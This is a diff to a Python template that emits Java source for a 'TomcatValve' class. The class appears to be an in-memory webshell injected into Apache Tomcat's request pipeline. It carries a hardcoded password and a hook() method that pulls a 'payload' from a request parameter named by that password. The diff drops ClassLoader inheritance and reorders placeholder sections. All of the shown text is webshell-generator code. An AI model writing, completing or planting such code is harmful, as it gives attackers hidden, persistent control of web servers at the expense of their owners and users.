@@ -2,13 +2,13 @@ code = """
 import java.lang.reflect.*;
 import java.util.*;
 
-public class TomcatValve extends ClassLoader implements InvocationHandler {{
+public class TomcatValve implements InvocationHandler {{
     private static String password = "{password}";
     private static Object nextvalve = null;
 {common}
+{context}
 {decoder}
 {stub}
-{context}
     private void hook(Object request, Object response) throws Exception {{
         String payload = (String) invokeMethod(
             request, "getParameter", password
@@ -66,10 +66,6 @@ public class TomcatValve extends ClassLoader implements InvocationHandler {{
                 }} catch (Exception e) {{}}
             }}
         }}
-    }}
-
-    public TomcatValve(ClassLoader loader) {{
-        super(loader);
     }}
 
     static {{
